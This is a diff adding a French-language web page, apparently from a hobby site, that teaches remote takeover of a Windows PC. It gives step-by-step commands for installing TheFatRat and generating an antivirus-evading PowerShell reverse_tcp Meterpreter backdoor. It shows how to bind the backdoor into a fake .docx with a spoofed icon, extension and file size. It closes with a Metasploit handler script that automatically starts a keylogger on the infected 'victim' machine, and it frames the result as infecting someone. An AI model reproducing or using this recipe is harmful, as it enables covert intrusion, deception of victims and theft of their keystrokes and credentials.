@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<>
+  <head>
+    <meta charset="utf-8">
+	<link rel="icon" href="../images/favicon.ico" />
+	<link rel="stylesheet" href="../css/style.css"/>
+    <title>Metasploit | Accéder, et controler un pc à distancer !</title>
+  </head>
+  <body>
+    <div class="header">
+      <div class="background_header">
+      <a style="float:left" class="btn_home" href="../index.html"><img class="kali_logo_header" src="../images/kali logo.jpg" width="30" height="30"></a>
+      <img style="float:right" class="header_cross" src="../images/cross_reducer.png" width="100" height="25">
+      <h1 class="center_window">root@kali: ~/Metasploit & TheFatRat</h1>
+    </div>
+    </div>
+    <h1 class="center_white">Comment accéder à un ordinateur à distance dans un réseau local en utilisant Metasploit ?</h1>
+    <p class="text">Avant tout, réflechissons comment opérer ! C'est un bon début.</p>
+
+    <ul class="possibility">
+      <li>Un KeyLogger  ► un .exe qui va nous permettre d'enregistrer toutes les frappes de quelqu'un.</li>
+      <li>Un RAT  ►  Mieux qu'un keylogger, il nous permet plus d'accès, capture d'écrans, envois de touches, téléchargement des fichiers...</li>
+      <li>Du phishing  ►  Envoyer un mail de l'entreprise où nous souhaitons récupérer le compte.</li>
+    </ul>
+
+    <p class="text">Je vais choisir l'option d'un RAT, c'est plus amusant puisqu'on a un accès à d'autres informations.</p>
+
+    <div class="Part1">
+      <h2 class="text">root@kali : cd metasploit/</h2>
+      <h2 class="text">root@kali : nano tuto_part1.txt</h2>
+      <p class="text">Pour nous faciliter la vie on va bind un Powershell à un fichier, comme un docx ou autres.</br>
+      Pour ce faire j'utilise l'os Kali Linux, disponible sur Raspberry Pi, VM ou en installation sur un PC, c'est cette dernière que j'ai choisie, mais vous pouvez tout aussi bien choisir Parrot OS ou RedHat</p>
+      <p class="text">Pour faire notre RAT on utilise l'outil TheFatRat que l'on peux installer en suivant ce <a href="https://github.com/Screetsec/TheFatRat#installation">tuto</a>.</p>
+    <div class="code">
+      <p class="text">Pour commencer, on va l'installer en utilisant git</br>
+     <code>sudo git clone https://github.com/Screetsec/TheFatRat</code></br>
+      Puis on accède au dossier créé</br>
+      <code>cd TheFatRat/</code></br>
+      Ensuite on change les permissions, et on rend l'outil exécutable</br>
+      <code>sudo chmod +x setup.sh</code></br>
+      Puis on lance l'installation du setup</br>
+      <code>sudo ./setup.sh</code></br>
+      Enfin on lance TheFatRat</br>
+      <code>sudo fatrat</code></p>
+    </div>
+    </div>
+
+    <div class="pwsh">
+      <h2 class="text">root@kali : nano tuto_part2.txt</h2>
+     <div class="pic" id="test2">
+      <p class="text2">Pour commencer on selectionne <code>"[6] Create Fud Backdoor 1000% with PwnWinds"</code>. Je précise que FUD signifie qu'il sera invisible aux yeux des antivirus !</p>
+      <img alt="terminal linux" src="../images/menu1_fatrat.png" width="300" height="368">
+      <p class="text2">Puis on sélectionne <code>"[1] Create a bat file+Powershell (FUD 100%)"</code>.</br>
+      Ensuite, on défini l'ip et le port utilisées.</br>
+      Je recommande le port <code>4444</code>.</br>
+      Puis on définie le nom du fichier <code>.bat</code>.</br>
+      Enfin, on sélectionne le Payload, je conseille un bon reverse_tcp sous <code>windows/meterpreter</code>.</br>
+      Pour ce qui est de "l'infectation" on voit ca après, mais d'abord, le fichier .bat se trouve dans le dossier <code>/root/TheFatRat/output</code>, vous devez le déplacer a l'un de vos pc sous Windows pour continuer les manipulations.</p>
+      <img alt="terminal linux" src="../images/menu2_fatrat.png" width="300" height="368">
+    </div>
+    </div>
+    <div class="UST">
+      <h2 class="text">root@kali : nano tuto_part3.txt</h2>
+      <p>Pour cela nous aurons besoin de <code>Ultimate Spreading Tool</code>, il est disponible facilement sur internet.</br>
+      Vous lancez UST (Ultimate Spreading Tool) et vous sélectionnez <code>binder</code>, vous sélectionnez le fichier <code>.bat</code> et le fichier qui va nous permettre de le cacher telle que un <code>.docx</code></br>
+      Et enfin on <code>build</code> le tout,le fichier sorti sera un .exe qui ouvre notre docx en lançant notre powershell</br>
+      </br>
+      Ensuite nous voulons changer l'icon pour simuler un vrai fichier docx, il y en a plein sur internet accessible facilement</br>
+      Pour ce faire nous allons sélectionner <code>Icon Changer</code> dans UST, je pense que vous avez compris la manipulation.</br>
+      Puis, on build le tous.</p>
+      <p>Et enfin on sélectionne <code>Spoof & pump</code></br>
+      On prends le fichier .exe, on met l'extension a <code>.docx</code></br>
+      On coche Pump File, et on mets la taille identique à notre fichier docx pour rendre ça plus crédible.</br>
+      Et enfin, on <code>build</code> le tous.</p>
+    </div>
+
+    <div class="Part2">
+      <h2 class="text">root@kali : nano tuto_part4.txt</h2>
+      <p class="text">Créeons un fichier : <code>start.rc</code></br>
+      Pour se faire, dans votre terminale, dans le dossier de votre choix, faite : <code>touch start.rc</code>, ceci va créer un fichier appelé start.rc.</br>
+      Ensuite, nous éditons ce fichier, en faisant : <code>nano start.rc</code></br>
+      Et vous collez/écrivez ceci : </br>
+      <code>use multi/handler</br>
+        set PAYLOAD windows/meterpreter/reverse_tcp</br>
+        set LHOST [REMPLACEZ PAR VOTRE IP]</br>
+        set LPORT 4444</br>
+        set AutoRunScript post/windows/capture/keylog_recorder</br>
+        exploit -j -z
+      </code></br>
+      Et enfin on execute cette commande : <code>sudo msfconsole -r start.rc</code></br>
+      Ceci va <bold>automatiser</bold> l'execution du keylogger à la connexion de la victime.</p>
+    </div>
+
+    <div class="conclusion">
+      <h2 class="text">root@kali : nano Conclusion.txt</h2>
+      <p class="text">Voila, vous avez réussi à infecter un ordinateur, je précise que ce tutoriel est à but informatif, et éducatif, je ne suis en aucun cas responsable de se que vous faites.</br>
+      Dans le prochain tuto, nous allons voir comment faire du phishing avec ngrok.</p>
+    </div>
+	</body>
+</html>
